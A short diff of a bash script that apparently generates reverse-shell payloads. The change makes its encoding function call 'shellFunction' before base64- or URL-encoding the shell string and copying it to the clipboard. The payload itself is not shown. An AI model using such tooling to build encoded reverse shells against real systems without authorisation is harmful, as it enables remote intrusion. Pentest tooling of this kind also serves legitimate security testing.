@@ -145,17 +145,17 @@ function shellFunction(){
 function encoding(){
 	if [ $code ]; then
 		if [ $code == "b64" ]; then
-			mainScript
+			shellFunction
 			encode=$(echo $shell | base64)
 			echo -e "${redColour}[*] ${endColour}${grayColour}Reverse Shell (base64) ${endColour}${redColour}-> ${endColour}${yellowColour}$encode${endColour}"; echo -e "$encode" | xclip -sel clip
 
 		elif [ $code == "url" ]; then
-			mainScript
+			shellFunction
 			encode=$(urlencode -m "$shell")
 			echo -e "${redColour}[*] ${endColour}${grayColour}Reverse Shell (url) ${endColour}${redColour}-> ${endColour}${yellowColour}$encode${endColour}"; echo -e "$encode" | xclip -sel clip
 				
 		elif [ $code == "url2" ]; then
-			mainScript
+			shellFunction
 			encode=$(urlencode "$shell")
 			echo -e "${redColour}[*] ${endColour}${grayColour}Reverse Shell (url) ${endColour}${redColour}-> ${endColour}${yellowColour}$encode${endColour}"; echo -e "$encode" | xclip -sel clip
 		
